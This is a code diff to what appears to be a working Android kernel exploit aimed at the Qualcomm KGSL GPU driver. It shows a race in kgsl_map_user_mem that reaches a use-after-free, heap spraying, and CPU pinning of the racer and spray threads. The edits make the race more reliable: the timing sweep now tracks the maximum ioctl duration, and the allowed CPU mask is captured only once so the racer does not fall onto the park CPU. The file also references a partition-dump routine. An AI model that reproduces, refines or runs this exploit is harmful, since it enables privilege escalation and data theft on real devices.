@@ -299,6 +299,7 @@ static long long sec_dump_partition(const char *name, unsigned char *dst,
     return -2;
 }
 static cpu_set_t g_allowed_cpus;
+static int g_affinity_captured;
 static cpu_set_t g_park_mask;
 static int g_park_cpu = -1;
 static cpu_set_t g_race_mask;
@@ -667,9 +668,11 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
     /*
      * kgsl_map_user_mem normally fails with ENOMEM here (the huge bogus
      * range), but the time it spends in the driver is still the real
-     * window.  Only the few-microsecond early failures say nothing.
+     * window.  Track the maximum: a jittering "latest" value makes the
+     * sweep jump around and never cover the longer attempts.
      */
-    if (ioctl_us >= 10) g_last_ioctl_us = ioctl_us;
+    if (ioctl_us >= 10 && ioctl_us > g_last_ioctl_us)
+        g_last_ioctl_us = ioctl_us;
     if (verbose && ioctl_us >= 10)
         printf("[*] racer ioctl took %lldus (mmap delay %dus)\n",
                (long long)ioctl_us, g_race_delay_us);
@@ -2012,8 +2015,17 @@ static int read_proc_task_state(pid_t pid, char *state)
 }
 
 static int pin_parent_for_spray(void) {
-    if (sched_getaffinity(0, sizeof(g_allowed_cpus), &g_allowed_cpus) < 0)
-        return -1;
+    /*
+     * Only capture the caller's mask once.  Every call ends by pinning the
+     * process to the park CPU, so re-reading sched_getaffinity() here would
+     * collapse the allowed set to {park} and silently put the racer on the
+     * same CPU as the mmap after the first call.
+     */
+    if (!g_affinity_captured) {
+        if (sched_getaffinity(0, sizeof(g_allowed_cpus), &g_allowed_cpus) < 0)
+            return -1;
+        g_affinity_captured = 1;
+    }
     long configured_cpu = 0;
     int env_status = read_env_long("KGSL_CPU", 0, CPU_SETSIZE - 1,
                                    &configured_cpu);
